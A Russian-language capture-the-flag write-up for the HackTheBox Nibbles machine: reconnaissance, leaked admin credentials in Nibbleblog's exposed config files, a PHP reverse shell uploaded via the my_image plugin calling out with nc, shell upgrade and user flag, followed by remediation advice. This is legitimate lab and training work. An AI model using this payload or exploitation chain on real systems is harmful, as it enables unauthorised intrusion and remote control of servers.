Дата: 28 января 2026
Цель: Получение доступа к системе и user flag на машине Nibbles (HTB)
Выполненные действия

Разведка и сканирование портовnmap -sV -sC -p- 10.129.15.175
Обнаружены открытые порты:
22/tcp → OpenSSH 7.2p2 Ubuntu
80/tcp → Apache 2.4.18

Анализ веб-приложения
curl http://10.129.15.175 → обнаружен комментарий <!-- /nibbleblog/ directory -->
Переход на http://10.129.15.175/nibbleblog/ → CMS Nibbleblog

Directory enumerationgobuster dir -u http://10.129.15.175/nibbleblog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
Найдены интересные пути: /admin, /content, /admin.php
Поиск конфиденциальных файлов
Обнаружен файл: http://10.129.15.175/nibbleblog/content/private/users.xml
Прочитан файл: http://10.129.15.175/nibbleblog/content/private/config.xml
Извлечены credentials:
Логин: admin
Пароль: nibbles (найден в конфиге и заголовке сайта)


Анализ плагинов и загрузка файлов
Обнаружен плагин my_image в /nibbleblog/content/private/plugins/my_image/
Выявлена возможность загрузки файлов через административную панель
Загружен вредоносный PHP-файл image.php с reverse shell:PHP<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9443 >/tmp/f"); ?>

Получение обратной оболочки
Запущен listener: nc -lvnp 9443
Доступ получен от имени пользователя nibbler

Улучшение оболочки
Выполнена команда: python3 -c 'import pty; pty.spawn("/bin/bash")'
Получена полноценная интерактивная оболочка

Переход в домашний каталог и получение флага
cd /home/nibbler
Найден и прочитан user flag: /home/nibbler/user.txt


Результат
Получен доступ к системе от имени пользователя nibbler и успешно извлечён user flag.
Рекомендации по устранению (AppSec)

Запретить прямой доступ к директории /content/private/ через веб-сервер (добавить правила в .htaccess или Apache конфиг).
Удалить или отключить плагин my_image, если он не используется.
Запретить загрузку PHP-файлов через административную панель (разрешить только изображения с проверкой MIME-типа и расширений).
Хранить конфиденциальные файлы (config.xml, users.xml) вне веб-корня.
Использовать сильные, уникальные пароли и внедрить 2FA для административной панели.
Обновить Nibbleblog до последней версии (текущая версия содержит известные уязвимости).
Настроить правильные права доступа: веб-сервер не должен иметь права на запись в директории плагинов.
Внедрить WAF (ModSecurity) с правилами против file upload и reverse shell.